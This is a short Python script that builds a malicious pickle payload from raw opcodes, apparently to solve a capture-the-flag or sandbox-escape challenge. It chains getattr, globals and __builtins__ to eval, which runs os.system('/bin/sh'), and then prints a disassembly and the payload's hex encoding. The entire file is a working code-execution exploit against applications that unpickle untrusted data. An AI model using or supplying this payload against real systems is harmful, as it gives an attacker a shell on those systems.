from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'

p += GLOBAL
p += b'builtins\n'
p += b'getattr\n'
p += MEMOIZE  # memo[0] = getattr function

p += GLOBAL
p += b'builtins\n'
p += b'globals\n'
p += EMPTY_TUPLE
p += REDUCE
p += STRING
p += b'"get"\n'

p += TUPLE2

p += REDUCE

p += STRING
p += b'"__builtins__"\n'
p += TUPLE1

p += REDUCE
p += MEMOIZE  # memo[1] = builtins module
p += POP

p += GET
p += b'0\n'

p += GET
p += b'1\n'
p += STRING
p += b'"eval"\n'
p += TUPLE2
p += REDUCE

p += STRING
p += b'"__import__(\'os\').system(\'/bin/sh\')"\n'
p += TUPLE1
p += REDUCE

p += STOP

dis(p)
print("="*50)
print(p.hex())
